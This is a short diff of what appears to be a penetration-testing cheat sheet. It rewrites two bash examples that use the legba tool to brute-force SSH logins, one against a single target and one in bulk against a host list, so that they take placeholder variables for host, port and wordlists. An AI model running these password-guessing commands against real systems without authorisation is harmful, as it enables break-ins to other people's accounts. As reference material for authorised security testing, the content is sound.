@@ -6,14 +6,14 @@
 
 ```bash
 # https://github.com/evilsocket/legba
-legba ssh --target localhost:22 \
-    --username usernames.txt \
-    --password passwords.txt \
+legba ssh --target $RHOST:$RPORT \
+    --username $USER_LIST \
+    --password $PASS_LIST \
     --output-format jsonl --output ssh_brute.json
 
 # Bulk testing
-legba ssh --target @hosts.txt \
-    --username usernames.txt \
-    --password passwords.txt \
+legba ssh --target @$RHOST_LIST \
+    --username $USER_LIST \
+    --password $PASS_LIST \
     --output-format jsonl --output ssh_brute.json
 ```
